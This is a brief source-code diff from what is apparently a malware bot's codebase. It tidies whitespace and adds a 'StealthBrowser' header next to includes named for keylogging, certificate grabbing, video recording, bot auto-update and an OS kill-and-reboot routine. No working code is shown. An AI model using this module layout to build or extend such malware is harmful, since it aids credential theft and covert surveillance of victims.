@@ -27,15 +27,11 @@
 
 #include "KeyLogSystems.h" 
 
-
 #include "Hunter.h" 
 
 #include "CertGrab.h"
 
-
-
 #include "KillOs_Reboot.h"
-
 
 #include "VideoRecorder.h" 
 
@@ -43,4 +39,6 @@
 #include "BotAutoUpdate.h"
 	
 #include "AzConfig.h"
+
+#include "StealthBrowser.h"
 
